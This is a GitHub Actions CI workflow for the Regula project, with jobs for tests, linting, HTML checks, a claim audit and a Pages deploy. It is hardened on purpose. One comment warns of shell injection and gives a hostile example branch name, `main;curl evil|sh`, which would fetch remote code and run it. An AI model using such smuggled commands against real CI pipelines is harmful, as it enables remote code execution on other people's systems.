name: CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# Least-privilege default; jobs that need more declare it at job level
# (release.yml's publish job declares id-token: write itself).
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.10", "3.11", "3.12", "3.13"]
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: ${{ matrix.python-version }}
      - run: pip install pyyaml "pytest~=9.0" "cryptography>=41,<50" "asn1crypto>=1.5.1,<2"
      - name: Custom test runner (manual list — asserts every test is registered)
        run: python3 tests/test_classification.py
      - name: pytest discovery (catches anything not in the manual list)
        run: pytest tests/ -q
      - name: Built-in self-test
        run: python3 -m scripts.cli self-test
      - name: Doctor health checks
        run: python3 -m scripts.cli doctor
      - name: Security self-check (blocks unexpected findings in Regula's own source)
        run: python3 -m scripts.cli security-self-check

  lint:
    name: Lint (ruff)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"
      - run: pip install ruff
      - name: Check for genuine code issues (not style)
        run: ruff check scripts/ tests/ --select F821,F811 --ignore E402 --exclude "tests/fixtures"

  html-wellformed:
    name: HTML well-formedness (landing pages)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"
      - name: Check all *.html parse with zero mismatched tags
        run: |
          python3 - <<'PY'
          import html.parser, sys, glob
          class P(html.parser.HTMLParser):
              def __init__(self):
                  super().__init__()
                  self.stack = []
                  self.errs = []
              def handle_starttag(self, t, a):
                  if t not in ('br','img','meta','link','input','hr','source'):
                      self.stack.append(t)
              def handle_endtag(self, t):
                  if self.stack and self.stack[-1] == t:
                      self.stack.pop()
                  else:
                      self.errs.append(f"mismatch {t} at line {self.getpos()[0]}")
          fail = 0
          for f in sorted(glob.glob("site/**/*.html", recursive=True)):
              p = P()
              try:
                  p.feed(open(f, encoding='utf-8').read())
                  if p.stack or p.errs:
                      print(f"::error file={f}::unclosed={len(p.stack)} errs={len(p.errs)}")
                      fail = 1
                  else:
                      print(f"{f}: OK")
              except Exception as e:
                  print(f"::error file={f}::{e}")
                  fail = 1
          sys.exit(fail)
          PY

  claim-audit:
    name: Claim auditor (docs & landing pages)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
        with:
          fetch-depth: 0
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"
      # site_facts measures total_collected via pytest --collect-only, and
      # collection imports the test modules — install the same deps as the
      # test matrix or the count is unmeasurable (site_facts then exits 1).
      - run: pip install pyyaml "pytest~=9.0" "cryptography>=41,<50" "asn1crypto>=1.5.1,<2"
      - name: Scan modified Markdown/HTML for unverified claims
        env:
          # Passed via env, never interpolated into the shell. `base_ref` is
          # a branch name chosen by whoever opens the PR — on a fork that is
          # an untrusted party, and `${{ }}` expansion happens before the
          # shell runs, so a branch named `main;curl evil|sh` would execute.
          BASE_REF: ${{ github.base_ref }}
          EVENT_NAME: ${{ github.event_name }}
        run: |
          if [ "$EVENT_NAME" = "pull_request" ]; then
            python3 scripts/claim_auditor.py --diff-base "origin/$BASE_REF"
          else
            python3 scripts/claim_auditor.py --diff-base HEAD~1
          fi
      - name: Verify site_facts artifacts are up-to-date
        run: |
          python3 -m scripts.site_facts
          git diff --exit-code data/site_facts.json data/site_facts.md
      - name: Verify published numbers match canonical counts
        run: python3 scripts/claim_auditor.py --verify-facts

  deploy:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    needs: test
    concurrency:
      group: pages
      cancel-in-progress: true
    runs-on: ubuntu-latest
    permissions:
      pages: write
      id-token: write
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
      - uses: actions/configure-pages@45bfe0192ca1faeb007ade9deae92b16b8254a0d # v6
      - uses: actions/upload-pages-artifact@fc324d3547104276b827a68afc52ff2a11cc49c9 # v5
        with:
          # Site sources live under ./site/ after the IA restructure.
          # The artifact's contents become the root of the deployed site
          # (e.g. site/index.html → https://getregula.com/,
          #       site/regions/uae.html → https://getregula.com/regions/uae.html).
          path: './site'
      - uses: actions/deploy-pages@cd2ce8fcbc39b97be8ca5fce6e763baed58fa128 # v5
        id: deployment
